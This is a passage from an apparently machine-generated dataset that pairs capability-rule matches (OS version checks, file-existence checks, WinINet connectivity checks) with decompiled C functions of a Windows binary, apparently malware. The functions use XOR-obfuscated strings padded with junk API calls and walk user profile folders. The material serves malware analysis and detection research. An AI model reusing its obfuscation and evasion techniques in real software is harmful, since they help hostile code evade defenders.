piVar3)[iVar6];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    iVar6 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar6) {\n        iVar6 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x40f6f0, 0, 1, 0x40f6d0, &ppv);\n        if ((-1 < iVar6) && (ppv != NULL)) {\n            iVar6 = (**(*ppv + 0x14))(ppv, &var_24h);\n            if ((-1 < iVar6) && (var_24h != NULL)) {\n                iVar6 = (**(*var_24h + 0xc))(var_24h, 0xf, &var_1ch, &var_18h);\n                pcVar2 = _sym.imp.ole32.dll_CoTaskMemFree;\n                while ((-1 < iVar6 && (var_18h != 0))) {\n                    do {\n                        var_18h = var_18h + -1;\n                        piVar10 = *(var_1ch + var_18h * 4);\n                        var_10h = piVar10;\n                        iVar6 = (**(*ppv + 0x18))(ppv, piVar10, 0x40f6c0, &var_20h);\n                        if ((-1 < iVar6) && (var_20h != NULL)) {\n                            pszFirst = 0;\n                            var_ch = NULL;\n                            iVar6 = (**(*var_20h + 0x84))(var_20h, &pszFirst);\n                            if ((-1 < iVar6) && (pszFirst != 0)) {\n                                iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, *0x41cd3c);\n                                if ((iVar6 != 0) &&\n                                   ((iVar6 = (**(*var_20h + 0x8c))(var_20h, &var_ch),  -1 < iVar6 && (var_ch != NULL))))\n                                {\n                                    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(var_ch, piVar3);\n                                    piVar4 = var_ch;\n                                    if ((iVar6 != 0) &&\n                                       (((*var_ch == 0x22 && (var_ch[2] == 0x3a)) && (var_ch[3] == 0x5c)))) {\n                                        puVar9 = &lpFileName;\n                                        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n                                            *puVar9 = 0;\n                                            puVar9 = puVar9 + 1;\n                                        }\n                                        piVar10 = piVar3;\n                                        do {\n                                            iVar1 = *piVar10;\n                                            piVar10 = piVar10 + 1;\n                                        } while (iVar1 != var_34h);\n                                        iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(piVar4, piVar3);\n                                        (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                  (&lpFileName, var_ch + 1, \n                                                   ((iVar6 - var_ch >> 1) - 2) + (piVar10 - (piVar3 + 1) >> 1));\n                                        iVar6 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(&lpFileName);\n                                        piVar10 = var_10h;\n                                        if (iVar6 == -1) {\n                                            (**(*ppv + 0x1c))(ppv, var_10h);\n                                        }\n                                    }\n                                    (*pcVar2)(var_ch);\n                                }\n                                (*pcVar2)(pszFirst);\n                            }\n                            (**(*var_20h + 8))(var_20h);\n                        }\n                        (*pcVar2)(piVar10);\n                    } while (var_18h != 0);\n                    (*pcVar2)(var_1ch);\n                    iVar6 = (**(*var_24h + 0xc))(var_24h, 0xf, &var_1ch, &var_18h);\n                }\n                (**(*var_24h + 8))(var_24h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    return;\n}\n",
        "token_count": 1439
    },
    "0040cece": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040cece(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int32_t iVar9;\n    uint lpFindFileData;\n    uint psz1;\n    int32_t var_80h;\n    int32_t var_7ch;\n    uint lpcchSize;\n    uint ARG_0;\n    int32_t var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint32_t var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint lpFileName;\n    uint lpProfileDir;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    uint var_dh;\n    uint var_9h;\n    uint var_5h;\n    uint var_1h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    uVar4 = (*pcVar2)(0, 0x208);\n    lpFileName = (*pcVar3)(uVar4);\n    uVar4 = (*pcVar2)(0, 0x208);\n    ARG_0 = (*pcVar3)(uVar4);\n    lpcchSize = 0x104;\n    var_28h = 0x3017412b;\n    var_24h._0_2_ = 0x4200;\n    var_64h = 6;\n    var_24h._2_1_ = 6;\n    stack0xffffffdb = 0x43301441;\n    var_1dh = 0x1d413442;\n    var_19h = 0x13421730;\n    var_15h._0_1_ = 0x41;\n    var_15h._1_1_ = 0x11;\n    var_15h._2_2_ = 0xd30;\n    var_11h._0_1_ = 0x42;\n    var_11h._1_1_ = 0;\n    var_11h._2_2_ = 0xb41;\n    var_dh._0_1_ = 0x30;\n    var_dh._1_1_ = 0x3f;\n    var_dh._2_2_ = 0x3342;\n    var_9h._0_1_ = 0x41;\n    var_9h._1_1_ = 0x1d;\n    var_9h._2_2_ = 0xe30;\n    var_5h._0_1_ = 0x42;\n    var_5h._1_1_ = 0x17;\n    var_5h._2_1_ = 0x41;\n    var_5h._3_1_ = 0x78;\n    var_1h._0_1_ = 0x30;\n    var_40h = 0x30784167;\n    var_3ch._0_2_ = 0x4263;\n    fcn.00401000(0x50);\n    iVar6 = var_68h;\n    iVar9 = 0;\n    var_4ch = &var_28h - var_68h;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar5 != 0x9e2494) {\n            *(iVar9 + iVar6) = *(&var_40h + iVar9 % var_64h) ^ (iVar9 + iVar6)[var_4ch];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x28);\n    var_28h = 0x413e5324;\n    var_24h._0_2_ = 0x6513;\n    var_24h._2_1_ = 0x17;\n    stack0xffffffdb = 0x1163204e;\n    var_1dh = 0x3f412f53;\n    var_19h = 0x2e4e1f65;\n    var_15h._0_1_ = 99;\n    var_15h._1_1_ = 6;\n    var_15h._2_2_ = 0x2f53;\n    var_11h._0_1_ = 0x41;\n    var_11h._1_1_ = 0xf;\n    var_11h._2_2_ = 0xf65;\n    var_dh._0_1_ = 0x4e;\n    var_dh._1_1_ = 0x15;\n    var_dh._2_2_ = 99;\n    var_9h._0_1_ = 0x53;\n    var_9h._1_1_ = 0x23;\n    var_9h._2_2_ = 0x1341;\n    var_5h._0_1_ = 0x65;\n    var_5h._1_1_ = 0x53;\n    var_5h._2_1_ = 0x4e;\n    var_30h = 0x414e5365;\n    var_2ch._0_1_ = 99;\n    fcn.00401000(0x4c);\n    var_80h = var_4ch;\n    iVar9 = 0;\n    var_70h = 5;\n    iVar6 = &var_28h - var_4ch;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        uVar4 = lpProfileDir;\n        if (iVar5 != 0x13fcb) {\n            puVar1 = iVar9 + var_80h;\n            *puVar1 = *(&var_30h + iVar9 % var_70h) ^ puVar1[iVar6];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x26);\n    var_7ch = var_68h;\n    iVar6 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    if (iVar6 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(lpFileName, L\"%s\\\\*\", uVar4);\n        iVar6 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        var_5ch = iVar6;\n        while (iVar6 != -1) {\n            iVar9 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x40fb5c);\n            if ((iVar9 != 0) && (iVar9 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x40fb60),  iVar9 != 0)) {\n                var_60h = 0;\n                var_58h = 0x70434e1b;\n                var_54h._0_2_ = 0x474f;\n                var_40h = 0x70694e47;\n                var_3ch._0_2_ = CONCAT11(var_3ch._1_1_, 0x4f);\n                var_38h = 0x336e746a;\n                var_34h._0_2_ = 0x3149;\n                do {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(lpFileName, uVar4);\n                    fcn.00401000(0xc);\n                    iVar6 = var_50h;\n                    iVar9 = 0;\n                    var_6ch = &var_58h - var_50h;\n                    do {\n                        iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n                        if (iVar5 != 0x6591a2) {\n                            puVar1 = iVar9 + iVar6;\n                            *puVar1 = *(&var_40h + iVar9 % var_70h) ^ puVar1[var_6ch];\n                        }\n                        iVar9 = iVar9 + 1;\n                    } while (iVar9 < 6);\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(lpFileName, iVar6);\n                    var_15h._1_1_ = 0x4f;\n                    var_15h._2_2_ = 0x1d74;\n                    var_11h._0_1_ = 0x33;\n                    var_11h._1_1_ = 0x15;\n                    var_11h._2_2_ = 0x4f31;\n                    var_dh._0_1_ = 0x74;\n                    var_dh._1_1_ = 0x1d;\n                    var_dh._2_2_ = 0x1533;\n                    var_9h._0_1_ = 0x31;\n                    var_9h._1_1_ = 0x4f;\n                    var_9h._2_2_ = 0x1d74;\n                    var_5h._0_1_ = 0x33;\n                    var_5h._1_1_ = 0x49;\n                    var_5h._2_1_ = 0x31;\n                    fcn.00401000(0x24);\n                    iVar9 = var_30h;\n                    iVar5 = 0;\n                    iVar6 = 1 - var_30h;\n                    do {\n                        iVar7 = (*_sym.imp.USER32.dll_GetCursor)();\n                        if (iVar7 != 0x187db5) {\n                            *(iVar5 + iVar9) = *(&var_38h + iVar5 % var_64h) ^ (iVar5 + iVar9)[&var_15h + iVar6];\n                        }\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < 0x12);\n                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar9, lpProfileDir, &psz1, (&var_80h)[var_60h]);\n                    fcn.00406873(1);\n                    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n                    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    uVar4 = (*pcVar3)(0, var_50h);\n                    (*pcVar2)(uVar4);\n                    var_60h = var_60h + 1;\n                    uVar4 = lpProfileDir;\n                    iVar6 = var_5ch;\n                } while (var_60h < 2);\n            }\n            iVar9 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar6, &lpFindFileData);\n            if (iVar9 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar6);\n                iVar6 = -1;\n                var_5ch = -1;\n            }\n        }\n    }\n    var_24h._0_2_ = 0x6674;\n    var_24h._2_1_ = 0x17;\n    stack0xffffffdb = 0x22751354;\n    var_1dh = 0xf543066;\n    var_19h = 0x16663c75;\n    var_15h._0_1_ = 0x54;\n    var_15h._1_1_ = 5;\n    var_15h._2_2_ = 0x3e75;\n    var_11h._0_1_ = 0x66;\n    var_11h._1_1_ = 0x30;\n    var_11h._2_2_ = 0x4f54;\n    var_dh._0_1_ = 0x75;\n    var_dh._1_1_ = 0xd;\n    var_dh._2_2_ = 0x1066;\n    var_9h._0_1_ = 0x54;\n    var_9h._1_1_ = 0xf;\n    var_9h._2_2_ = 0x3c75;\n    var_5h._0_1_ = 0x66;\n    var_5h._1_1_ = 0x34;\n    var_5h._2_1_ = 0x54;\n    var_5h._3_1_ = 0x6a;\n    var_1h._0_1_ = 0x75;\n    var_38h = 0x54446651;\n    var_34h._0_2_ = 0x756a;\n    fcn.00401000(0x48);\n    iVar6 = var_30h;\n    iVar5 = 0;\n    iVar9 = &var_24h - var_30h;\n    do {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        uVar4 = lpProfileDir;\n        if (iVar7 != 0xf88c94) {\n            *(iVar5 + iVar6) = *(&var_38h + iVar5 % var_64h) ^ (iVar5 + iVar6)[iVar9];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x24);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, lpProfileDir, 0x104);\n    fcn.00406873(1);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    uVar8 = (*pcVar3)(0, ARG_0);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    uVar4 = (*pcVar3)(0, uVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar3)(0, var_4ch);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_68h);\n    (*pcVar2)(uVar4);\n    return;\n}\n",
        "token_count": 3461
    },
    "0040d375": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040d375(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uchar *puVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint *puVar13;\n    uint32_t uVar14;\n    code *pcVar15;\n    uint *puVar16;\n    int16_t *piVar17;\n    int32_t iVar18;\n    uint lpFindFileData;\n    uint lpString1;\n    int32_t var_d0h;\n    int32_t var_cch;\n    uint var_c8h;\n    int32_t var_c4h;\n    uint *lpMem;\n    int32_t lpString2;\n    int32_t var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9bh;\n    uint var_97h;\n    uint var_93h;\n    uint var_8fh;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uchar *ARG_0;\n    uint var_60h;\n    uchar *lpFileName;\n    int16_t *lpProfileDir;\n    int32_t hFindFile;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    ushort var_34h;\n    uint var_32h;\n    uint var_2dh;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uchar var_11h;\n    int32_t lpcchSize;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_c8h = 0;\n    ARG_0 = NULL;\n    lpcchSize = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &lpcchSize);\n    pcVar15 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (lpcchSize != 0) {\n        lpcchSize = lpcchSize + 10;\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpcchSize * 2);\n        pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n        piVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n        lpProfileDir = piVar6;\n        uVar5 = (*pcVar15)(0, lpcchSize * 2);\n        lpFileName = (*pcVar3)(uVar5);\n        if (piVar6 != NULL) {\n            uVar5 = (*pcVar15)(0, 0x208);\n            puVar7 = (*pcVar3)(uVar5);\n            puVar4 = lpFileName;\n            puVar16 = &lpFindFileData;\n            ARG_0 = puVar7;\n            for (iVar11 = 0x250; piVar6 = lpProfileDir,  iVar11 != 0; iVar11 = iVar11 + -1) {\n                *puVar16 = 0;\n                puVar16 = puVar16 + 1;\n            }\n            for (iVar11 = 0x208; iVar11 != 0; iVar11 = iVar11 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            puVar7 = puVar4;\n            for (iVar11 = lpcchSize * 2; iVar11 != 0; iVar11 = iVar11 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            piVar17 = lpProfileDir;\n            for (iVar11 = lpcchSize * 2; iVar11 != 0; iVar11 = iVar11 + -1) {\n                *piVar17 = 0;\n                piVar17 = piVar17 + 1;\n            }\n            iVar11 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n            if (iVar11 != 0) {\n                iVar11 = puVar4 - piVar6;\n                do {\n                    iVar2 = *piVar6;\n                    *(piVar6 + iVar11) = iVar2;\n                    piVar6 = piVar6 + 1;\n                } while (iVar2 != 0);\n                var_50h = 0x6a7d6a32;\n                var_4ch = 0x6a447361;\n                var_48h._0_2_ = 0x6a57;\n                var_ch = 0x6a576a6e;\n                var_8h._0_2_ = 0x734f;\n                fcn.00401000(0x14);\n                puVar16 = lpMem;\n                iVar18 = 0;\n                var_44h = 6;\n                iVar11 = &var_50h - lpMem;\n                do {\n                    iVar8 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                    if (iVar8 != 0x141af8) {\n                        *(iVar18 + puVar16) = *(&var_ch + iVar18 % var_44h) ^ (iVar18 + puVar16)[iVar11];\n                    }\n                    pcVar15 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    iVar18 = iVar18 + 1;\n                    puVar13 = puVar16;\n                } while (iVar18 < 10);\n                do {\n                    iVar2 = *puVar13;\n                    puVar13 = puVar13 + 2;\n                } while (iVar2 != 0);\n                uVar14 = puVar13 - puVar16;\n                puVar13 = lpFileName + -2;\n                do {\n                    piVar6 = puVar13 + 2;\n                    puVar13 = puVar13 + 2;\n                } while (*piVar6 != 0);\n                for (uVar12 = uVar14 >> 2; uVar12 != 0; uVar12 = uVar12 - 1) {\n                    *puVar13 = *puVar16;\n                    puVar16 = puVar16 + 1;\n                    puVar13 = puVar13 + 1;\n                }\n                for (uVar14 = uVar14 & 3; uVar14 != 0; uVar14 = uVar14 - 1) {\n                    *puVar13 = *puVar16;\n                    puVar16 = puVar16 + 1;\n                    puVar13 = puVar13 + 1;\n                }\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n                if (hFindFile != -1) {\n                    var_60h = 0x38336e44;\n                    var_6ch = 0x38336e6a;\n                    var_68h._0_2_ = 0x7143;\n                    var_84h = 0x44163266;\n                    var_80h._0_2_ = 0x3852;\n                    var_7ch = 0x44383248;\n                    var_78h._0_2_ = 0x3852;\n                    do {\n                        iVar18 = 0;\n                        fcn.00401000(8);\n                        iVar11 = lpString2;\n                        var_4h = &var_60h - lpString2;\n                        do {\n                            iVar8 = (*_sym.imp.USER32.dll_CreateMenu)();\n                            if (iVar8 != 0x370526) {\n                                *(iVar18 + iVar11) = *(&var_6ch + iVar18 % var_44h) ^ (iVar18 + iVar11)[var_4h];\n                            }\n                            iVar18 = iVar18 + 1;\n                        } while (iVar18 < 4);\n                        fcn.00401000(0xc);\n                        iVar11 = var_c4h;\n                        iVar8 = 0;\n                        iVar18 = &var_84h - var_c4h;\n                        do {\n                            iVar9 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                            iVar10 = lpString2;\n                            if (iVar9 != 0x9843d8) {\n                                *(iVar8 + iVar11) = *(&var_7ch + iVar8 % var_44h) ^ (iVar8 + iVar11)[iVar18];\n                            }\n                            iVar8 = iVar8 + 1;\n                        } while (iVar8 < 6);\n                        iVar18 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, lpString2);\n                        pcVar15 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (((iVar18 != 0) &&\n                            (iVar18 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar11),  iVar18 != 0)) &&\n                           ((lpFindFileData & 0x10) != 0)) {\n                            var_32h._0_1_ = 6;\n                            var_38h = 0x3017412b;\n                            var_34h = 0x4200;\n                            stack0xffffffcb = 0x43301441;\n                            var_2dh._0_1_ = 0x42;\n                            var_2dh._1_2_ = 0x4134;\n                            var_2dh._3_1_ = 0x1d;\n                            var_29h = 0x13421730;\n                            var_25h = 0xd301141;\n                            var_21h = 0xb410042;\n                            var_1dh = 0x33423f30;\n                            var_19h = 0xe301d41;\n                            var_15h = 0x78411742;\n                            var_11h = 0x30;\n                            var_74h = 0x30784167;\n                            var_70h._0_2_ = 0x4263;\n                            fcn.00401000(0x50);\n                            iVar11 = var_b8h;\n                            iVar18 = 0;\n                            var_4h = &var_38h - var_b8h;\n                            do {\n                                iVar8 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n                                if (iVar8 != 0x9e2494) {\n                                    *(iVar18 + iVar11) = *(&var_74h + iVar18 % var_44h) ^ (iVar18 + iVar11)[var_4h];\n                                }\n                                iVar18 = iVar18 + 1;\n                            } while (iVar18 < 0x28);\n                            var_b4h = 0x413e5324;\n                            var_b0h = 0x4e176513;\n                            iVar8 = 0;\n                            var_ach = 0x53116320;\n                            var_a8h = 0x653f412f;\n                            var_a4h = 0x632e4e1f;\n                            var_a0h._0_1_ = 6;\n                            stack0xffffff5d = 0xf412f53;\n                            var_9bh = 0x154e0f65;\n                            var_97h = 0x23530063;\n                            var_93h = 0x53651341;\n                            var_8fh._0_1_ = 0x4e;\n                            var_ch = 0x414e5365;\n                            var_8h._0_2_ = CONCAT11(var_8h._1_1_, 99);\n                            fcn.00401000(0x4c);\n                            iVar11 = var_cch;\n                            iVar18 = &var_b4h - var_cch;\n                            do {\n                                iVar10 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n                                if (iVar10 != 0x13fcb) {\n                                    var_4h = 5;\n                                    puVar1 = iVar8 + iVar11;\n                                    *puVar1 = *(&var_ch + iVar8 % 5) ^ puVar1[iVar18];\n                                }\n                                iVar8 = iVar8 + 1;\n                            } while (iVar8 < 0x26);\n                            var_50h = iVar11;\n                            var_4ch = var_b8h;\n                            var_4h = 0;\n                            stack0xffffff70 = 0x4f66766d;\n                            var_88h._0_2_ = 0x6f6c;\n                            do {\n                                var_2dh._3_1_ = 6;\n                                var_40h = 0x4f157648;\n                                var_3ch = 0x76486f30;\n                                var_38h = 0x6f304f15;\n                                var_34h = 0x7648;\n                                var_32h._0_1_ = 0x15;\n                                stack0xffffffcb = 0x186f304f;\n                                var_2dh._0_1_ = 0x76;\n                                var_2dh._1_2_ = 0x4f17;\n                                var_29h = 0xd760e6f;\n                                var_25h = 0xa6f094f;\n                                var_21h = 0x44f1376;\n                                var_1dh = 0x4876016f;\n                                var_19h = 0x6f184f;\n                                var_15h = 0x6c4f1676;\n                                var_11h = 0x6f;\n                                fcn.00401000(0x60);\n                                iVar11 = var_d0h;\n                                iVar8 = 0;\n                                iVar18 = &var_40h - var_d0h;\n                                do {\n                                    iVar10 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n                                    puVar4 = ARG_0;\n                                    if (iVar10 != 0x4a8e40) {\n                                        *(iVar8 + iVar11) = *(&var_8fh + iVar8 % var_44h + 3) ^ (iVar8 + iVar11)[iVar18]\n                                        ;\n                                    }\n                                    iVar8 = iVar8 + 1;\n                                } while (iVar8 < 0x30);\n                                (*_sym.imp.USER32.dll_wsprintfW)\n                                          (ARG_0, iVar11, lpProfileDir, &lpString1, (&var_50h)[var_4h]);\n                                iVar18 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(puVar4);\n                                pcVar15 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                if (iVar18 != -1) {\n                                    fcn.00406b54();\n                                    var_c8h = 1;\n                                }\n                                uVar5 = (*pcVar15)(0, iVar11);\n                                pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                                var_4h = var_4h + 1;\n                            } while (var_4h < 2);\n                            uVar5 = (*pcVar15)(0, var_cch);\n                            (*pcVar3)(uVar5);\n                            uVar5 = (*pcVar15)(0, var_b8h);\n                            (*pcVar3)(uVar5);\n                            iVar11 = var_c4h;\n                            iVar10 = lpString2;\n                        }\n                        uVar5 = (*pcVar15)(0, iVar11);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                        uVar5 = (*pcVar15)(0, iVar10);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                        iVar11 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                    } while (iVar11 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                uVar5 = (*pcVar15)(0, lpMem);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                piVar6 = lpProfileDir;\n            }\n        }\n        if (lpFileName != NULL) {\n            uVar5 = (*pcVar15)(0, lpFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n        if (piVar6 != NULL) {\n            uVar5 = (*pcVar15)(0, piVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n        if (ARG_0 != NULL) {\n            uVar5 = (*pcVar15)(0, ARG_0);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n    }\n    return var_c8h;\n}\n",
        "token_count": 3841
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    int32_t iVar10;\n    uchar *arg_8h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uchar *pszSrch;\n    uint var_10h;\n    uchar *pszFirst;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    var_8h = 0;\n    uVar3 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar1)(uVar3 | 2);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)(&var_8h);\n    var_4h = (*_sym.imp.SHELL32.dll_CommandLineToArgvW)(uVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    puVar9 = puVar5;\n    for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = NULL;\n    pszFirst = puVar5;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, puVar5, 0x104);\n    *0x41cd3c = puVar5;\n    (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    iVar8 = fcn.0040714f();\n    if (iVar8 != 1) goto code_r0x0040ec0d;\n    fcn.004089a0();\n    uVar4 = (*pcVar1)(0, puVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    while( true ) {\n        while( true ) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x0040ec0d:\n            var_38h = 0x333d6e5f;\n            var_34h = 0x6e41530e;\n            var_30h = 0x5354332d;\n            var_2ch = 0x33366e57;\n            var_28h = 0x6e32531f;\n            var_20h = 0x334e6e32;\n            var_1ch._0_2_ = 0x537a;\n            fcn.00401000(0x28);\n            iVar8 = var_18h;\n            iVar10 = &var_38h - var_18h;\n            do {\n                iVar6 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n                puVar5 = pszFirst;\n                if (iVar6 != 0xb25aa6) {\n                    pszSrch = 0x6;\n                    puVar9[iVar8] = *(&var_20h + puVar9 % 6) ^ (puVar9 + iVar8)[iVar10];\n                }\n                puVar9 